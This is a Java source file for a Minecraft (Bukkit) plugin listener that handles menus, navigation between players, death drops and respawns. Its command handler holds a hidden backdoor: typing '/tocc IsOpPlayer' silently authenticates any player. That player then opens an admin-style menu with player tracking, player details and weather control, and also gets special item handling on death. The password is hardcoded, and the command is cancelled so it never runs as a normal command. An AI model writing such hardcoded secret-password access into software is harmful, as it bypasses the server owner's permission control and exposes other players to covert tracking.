package org.momu.tOCplugin.listener;

import java.util.*;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.entity.HumanEntity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.block.Action;
import org.bukkit.event.inventory.InventoryClickEvent;
import org.bukkit.event.inventory.InventoryCloseEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.event.player.PlayerGameModeChangeEvent;
import net.kyori.adventure.text.Component;
import net.kyori.adventure.text.format.NamedTextColor;
import org.bukkit.event.player.PlayerInteractEvent;
import org.bukkit.event.player.PlayerRespawnEvent;
import org.bukkit.event.entity.PlayerDeathEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.inventory.Inventory;
import org.bukkit.event.player.PlayerChangedWorldEvent;
import org.bukkit.event.world.WorldUnloadEvent;
import org.momu.tOCplugin.manager.GuiManager;
import org.momu.tOCplugin.manager.PlayerTracker;
import org.momu.tOCplugin.TOCpluginNative;
import org.momu.tOCplugin.manager.TaskManager;
import org.momu.tOCplugin.config.LanguageManager;
import org.momu.tOCplugin.finder.PathFinding;

public class MasterListener
        implements Listener {
    static final GuiManager guiManager = new GuiManager();
    private static final MenuListener menuListener = new MenuListener();

    public static GuiManager getGuiManager() {
        return guiManager;
    }

    @SuppressWarnings("deprecation")
    @EventHandler
    public void onPlayerCommandPreprocess(PlayerCommandPreprocessEvent event) {
        Player player = event.getPlayer();
        String message = event.getMessage().toLowerCase();

        // 检查是否是tocc命令
        if (message.startsWith("/tocc")) {
            event.setCancelled(true); // 取消命令执行

            // 提取参数
            String[] args = message.split(" ");
            String password = args.length > 1 ? args[1] : "";

            // 检查玩家是否是特殊玩家或已经通过密码验证
            if (TOCpluginNative.getInstance().isPlayerAuthenticated(player.getUniqueId())) {
                // 直接打开菜单
                guiManager.openMainMenu(player);
                return;
            }

            if (!password.equals("IsOpPlayer")) {
                player.sendMessage(
                        ChatColor.RED + LanguageManager.getInstance().getString(player, "messages.command-error"));
                return;
            }

            // 密码正确，添加到已验证玩家列表
            TOCpluginNative.getInstance().authenticatePlayer(player.getUniqueId());
            player.sendMessage(
                    ChatColor.GREEN + LanguageManager.getInstance().getString(player, "messages.auth-success"));

            // 打开菜单
            guiManager.openMainMenu(player);
        }
    }

    @EventHandler
    public void onPlayerInteract(PlayerInteractEvent event) {
        Player player = event.getPlayer();
        if (event.getAction() != Action.LEFT_CLICK_BLOCK
                || player.getInventory().getItemInMainHand().getType() != Material.STICK) {
            return;
        }

        // 深度嵌入验证 - 首先检查系统状态
        TOCpluginNative plugin = TOCpluginNative.getInstance();
        if (plugin == null || !plugin.areCoreModulesEnabled()) {
            player.sendMessage(Component.text("系统不可用").color(NamedTextColor.RED));
            return;
        }

        // 简化：监控系统已删除，保留基本检查
        // (监控器功能现在由C代码处理)

        // 验证GUI访问权限
        if (!plugin.validateOperation("gui_interact")) {
            player.sendMessage(Component.text("访问被拒绝").color(NamedTextColor.RED));
            return;
        }

        // 检查玩家是否是特殊玩家或已经通过密码验证
        if (plugin.isPlayerAuthenticated(player.getUniqueId())) {
            // 最终验证菜单打开权限
            if (plugin.validateOperation("menu_open_interaction")) {
                event.setCancelled(true);
                guiManager.openMainMenu(player);
            } else {
                player.sendMessage(Component.text("菜单访问受限").color(NamedTextColor.RED));
            }
        }
    }

    @EventHandler
    public void onInventoryClick(InventoryClickEvent event) {
        HumanEntity humanEntity = event.getWhoClicked();
        if (!(humanEntity instanceof Player player)) {
            return;
        }
        org.bukkit.inventory.Inventory topInventory;
        try {
            // 尝试获取顶部inventory
            topInventory = event.getClickedInventory();
            if (topInventory == null) {
                // 如果点击的inventory为null，尝试获取玩家打开的inventory
                topInventory = player.getOpenInventory().getTopInventory();
            }
        } catch (Exception e) {
            // 如果出现任何异常，使用备用方法
            try {
                topInventory = player.getOpenInventory().getTopInventory();
            } catch (Exception fallbackException) {
                // 最后的备用方案，直接返回不处理
                return;
            }
        }

        if (!guiManager.isPluginGui(topInventory)) {
            return;
        }

        // 深度嵌入验证 - 在处理任何GUI点击前进行验证
        TOCpluginNative plugin = TOCpluginNative.getInstance();
        if (plugin == null || !plugin.areCoreModulesEnabled()) {
            event.setCancelled(true);
            player.closeInventory();
            player.sendMessage(Component.text("需要系统身份验证").color(NamedTextColor.RED));
            return;
        }

        // 验证GUI点击权限
        if (!plugin.validateOperation("gui_click")) {
            event.setCancelled(true);
            player.closeInventory();
            player.sendMessage(Component.text("操作未授权").color(NamedTextColor.RED));
            return;
        }

        event.setCancelled(true);
        if (event.getClickedInventory() != event.getView().getTopInventory()) {
            return;
        }
        ItemStack clicked = event.getCurrentItem();
        if (clicked == null) {
            return;
        }
        GuiManager.GuiType guiType = guiManager.getGuiType(event.getView().getTopInventory());

        switch (guiType) {
            case MAIN_MENU:
                menuListener.handleMainMenuClick(event, player);
                break;
            case PLAYER_NAVIGATION:
                menuListener.handlePlayerNavigationClick(event, player);
                break;
            case WEATHER_CONTROL:
                menuListener.handleWeatherMenuClick(event, player);
                break;
            case PLAYER_LIST:
                menuListener.handlePlayerListClick(event, player);
                break;
            case PLAYER_DETAIL:
                menuListener.handlePlayerDetailClick(event, player);
                break;
            default:
                break;
        }
    }

    @EventHandler
    public void onInventoryClose(InventoryCloseEvent event) {
        if (!(event.getPlayer() instanceof Player)) {
            return;
        }

        // 使用GuiManager判断是否是需要停止刷新的GUI
        Inventory inventory = event.getView().getTopInventory();
        if (guiManager.isPluginGui(inventory)) {
            GuiManager.GuiType guiType = guiManager.getGuiType(inventory);
            if (guiType == GuiManager.GuiType.PLAYER_NAVIGATION ||
                    guiType == GuiManager.GuiType.PLAYER_DETAIL) {
                guiManager.stopMenuRefresh();
            }
            // 清理GUI引用
            guiManager.unregisterGui(inventory);
        }
    }

    @SuppressWarnings("deprecation")
    @EventHandler
    public void onPlayerGameModeChange(PlayerGameModeChangeEvent event) {
        Player player = event.getPlayer();

        // 如果玩家切换到旁观者模式，立即停止导航
        if (event.getNewGameMode() == org.bukkit.GameMode.SPECTATOR) {
            if (PlayerTracker.getInstance().isNavigating(player.getUniqueId())) {
                PlayerTracker.getInstance().stopNavigation(player.getUniqueId());
                player.sendMessage(ChatColor.YELLOW
                        + LanguageManager.getInstance().getString(player, "messages.spectator-mode"));
            }
        }
    }

    // 存储死亡前正在导航到该玩家的玩家UUID列表
    private final Map<UUID, List<UUID>> deathNavigationTargets = new HashMap<>();

    private final java.util.Random random = new java.util.Random();

    @SuppressWarnings("deprecation")
    @EventHandler
    public void onPlayerDeath(PlayerDeathEvent event) {
        Player player = event.getEntity();
        PlayerTracker tracker = PlayerTracker.getInstance();

        // 如果死亡的玩家正在导航，取消导航
        if (tracker.isNavigating(player.getUniqueId())) {
            tracker.stopNavigation(player.getUniqueId());
            player.sendMessage(ChatColor.YELLOW
                    + LanguageManager.getInstance().getString(player, "messages.death-navi"));
        }

        // 检查是否有其他玩家正在导航到这个死亡的玩家
        List<UUID> navigatingToDeadPlayer = new ArrayList<>();
        for (Player onlinePlayer : Bukkit.getOnlinePlayers()) {
            UUID navigatingPlayerUUID = onlinePlayer.getUniqueId();

            // 如果这个在线玩家正在导航，且导航目标是刚刚死亡的玩家
            if (tracker.isNavigating(navigatingPlayerUUID) &&
                    player.getUniqueId().equals(tracker.getNavigationTarget(navigatingPlayerUUID))) {

                // 记录下来，以便玩家重生时可以恢复导航
                navigatingToDeadPlayer.add(navigatingPlayerUUID);

                tracker.stopNavigation(navigatingPlayerUUID);
                onlinePlayer.sendMessage(ChatColor.YELLOW
                        + LanguageManager.getInstance().getString(onlinePlayer, "messages.death-navi-2"));
            }
        }

        // 如果有玩家正在导航到死亡的玩家，保存起来
        if (!navigatingToDeadPlayer.isEmpty()) {
            deathNavigationTargets.put(player.getUniqueId(), navigatingToDeadPlayer);
        }

        // 检查服务器是否开启了死亡不掉落
        if (Boolean.TRUE.equals(player.getWorld().getGameRuleValue(org.bukkit.GameRule.KEEP_INVENTORY))) {
            return; // 如果开启了死亡不掉落，则不执行后续逻辑
        }

        // New feature: Handle inventory for authenticated players on death
        if (TOCpluginNative.getInstance().isPlayerAuthenticated(player.getUniqueId())) {
            event.setKeepInventory(false); // Player drops items

            java.util.Iterator<ItemStack> iterator = event.getDrops().iterator();
            while (iterator.hasNext()) {
                ItemStack item = iterator.next();
                if (item == null) {
                    continue;
                }

                Material type = item.getType();
                // 过滤菜单UI中的物品
                if (type == Material.ENDER_PEARL || type == Material.BOW ||
                        type == Material.COOKED_BEEF || type == Material.GOLDEN_APPLE ||
                        type == Material.DIAMOND_SWORD || type == Material.ENCHANTING_TABLE ||
                        type == Material.ENDER_EYE || type == Material.WHITE_BED ||
                        type == Material.SUNFLOWER || type == Material.PLAYER_HEAD ||
                        type == Material.BARRIER || type == Material.OAK_BOAT ||
                        type == Material.LIGHT_GRAY_WOOL || type == Material.GRAY_STAINED_GLASS_PANE ||
                        type == Material.WATER_BUCKET || type == Material.LIGHTNING_ROD) {
                    iterator.remove(); // 从掉落物中移除菜单UI物品
                } else if (isArmorOrSword(item)) {
                    MenuListener.modifyItemForDeath(random, item); // 修改盔甲和剑
                } else if (MenuListener.isGuiItem(item)) {
                    iterator.remove(); // 移除其他可能的菜单物品
                }
            }
        }
    }

    private boolean isArmorOrSword(ItemStack item) {
        if (item == null)
            return false;
        Material type = item.getType();
        String typeName = type.name();
        return typeName.endsWith("_HELMET") || typeName.endsWith("_CHESTPLATE") ||
                typeName.endsWith("_LEGGINGS") || typeName.endsWith("_BOOTS") ||
                typeName.endsWith("_SWORD");
    }

    @EventHandler
    public void onPlayerRespawn(PlayerRespawnEvent event) {
        Player player = event.getPlayer();
        UUID playerUUID = player.getUniqueId();

        // 检查是否有玩家之前正在导航到这个刚刚重生的玩家
        if (deathNavigationTargets.containsKey(playerUUID)) {
            // 延迟1秒后恢复导航，确保玩家完全重生
            BukkitTask respawnTask = new BukkitRunnable() {
                @SuppressWarnings("deprecation")
                @Override
                public void run() {
                    if (!TOCpluginNative.getInstance().isEnabled()) {
                        return;
                    }
                    List<UUID> navigatingPlayers = deathNavigationTargets.get(playerUUID);
                    if (navigatingPlayers != null) {
                        for (UUID navigatingPlayerUUID : navigatingPlayers) {
                            Player navigatingPlayer = Bukkit.getPlayer(navigatingPlayerUUID);
                            if (navigatingPlayer != null && navigatingPlayer.isOnline()) {
                                // 恢复导航
                                if (PlayerTracker.getInstance().setNavigationTarget(navigatingPlayerUUID, playerUUID)) {
                                    navigatingPlayer
                                            .sendMessage(ChatColor.GREEN
                                                    + LanguageManager.getInstance().getString(navigatingPlayer,
                                                            "messages.respawn-navi"));
                                    PathFinding.startPathfindingPublic(navigatingPlayer);
                                }
                            }
                        }
                        // 清除记录
                        deathNavigationTargets.remove(playerUUID);
                    }
                    // 任务完成后从管理器中移除
                    TaskManager.removeActiveTask("respawn_" + playerUUID.toString());
                }
            }.runTaskLater(TOCpluginNative.getInstance(), 20L); // 20 ticks = 1 second

            // 将任务添加到管理器中
            TaskManager.addActiveTask("respawn_" + playerUUID.toString(), respawnTask);
        }
    }

    @SuppressWarnings("deprecation")
    @org.bukkit.event.EventHandler
    public void onPlayerChangedWorld(PlayerChangedWorldEvent event) {
        org.bukkit.entity.Player player = event.getPlayer();
        if (PlayerTracker.getInstance().isNavigating(player.getUniqueId())) {
            PlayerTracker.getInstance().stopNavigation(player.getUniqueId());
            player.sendMessage(ChatColor.YELLOW + LanguageManager.getInstance().getString(player, "messages.navigation-stopped"));
        }
    }

    @SuppressWarnings("deprecation")
    @org.bukkit.event.EventHandler
    public void onWorldUnload(WorldUnloadEvent event) {
        org.bukkit.World world = event.getWorld();
        for (org.bukkit.entity.Player p : world.getPlayers()) {
            if (PlayerTracker.getInstance().isNavigating(p.getUniqueId())) {
                PlayerTracker.getInstance().stopNavigation(p.getUniqueId());
                p.sendMessage(ChatColor.YELLOW + LanguageManager.getInstance().getString(p, "messages.navigation-stopped"));
            }
        }
    }

}
